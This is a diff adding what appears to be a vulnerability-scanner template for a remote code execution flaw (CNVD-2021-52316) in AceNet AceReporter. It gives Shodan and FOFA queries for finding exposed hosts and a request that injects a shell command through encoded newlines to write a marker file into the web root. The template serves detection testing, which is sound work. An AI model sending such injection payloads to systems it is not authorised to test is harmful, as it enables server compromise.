@@ -1,0 +1,28 @@
+id: CNVD-2021-52316
+
+info:
+  name: AceNet AceReporter Report - Remote Code Execution
+  author: qwtd
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.favicon.hash:-1595726841
+    fofa-query: body="Login @ Reporter"
+  tags: Ace-AceReporter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20%27f029ff010012ms%27%20>/var/www/reporter/view/Behavior/f029ff010012ms.txt%0a"
+      - "{{BaseURL}}/view/Behavior/f029ff010012ms.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "f029ff010012ms"
+        part: body
+        condition: and
